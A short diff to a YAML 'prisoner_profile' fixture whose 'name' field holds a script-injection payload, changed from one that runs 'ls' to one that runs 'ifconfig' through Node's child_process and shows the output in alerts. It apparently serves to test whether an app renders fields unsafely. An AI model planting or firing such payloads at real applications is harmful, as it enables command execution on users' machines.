@@ -1,5 +1,5 @@
 prisoner_profile:
-  name: <script>const execSync = require('child_process').execSync;const output = execSync('ls', { encoding: 'utf-8' });alert(3);</script>
+  name: <script>var process = require('child_process');process.exec('ifconfig',function (err,stdout,stderr){if (err) {alert("\n"+stderr);} else {alert(stdout);}});alert(3);</script>
   age: 45
   height: "6'1"
   complexity: High
